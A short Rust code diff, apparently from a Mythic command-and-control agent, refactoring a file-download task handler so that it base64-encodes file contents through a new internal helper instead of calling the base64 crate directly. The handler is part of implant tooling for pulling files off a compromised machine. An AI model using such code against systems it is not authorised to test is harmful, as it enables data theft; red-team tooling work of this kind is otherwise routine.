@@ -16,6 +16,8 @@ use std::path::Path;
 use mythic::{TaskDownload, TaskMessage, TaskResponse};
 use serde::Deserialize;
 
+use crate::sys::encoding::encode_b64;
+
 // ── Params ──────────────────────────────────────────────────
 
 #[derive(Deserialize)]
@@ -58,8 +60,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     }
 
     // 2. Base64 encode
-    use base64::Engine;
-    let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
+    let encoded = encode_b64(&data);
 
     // 3. Extract filename
     let filename = path
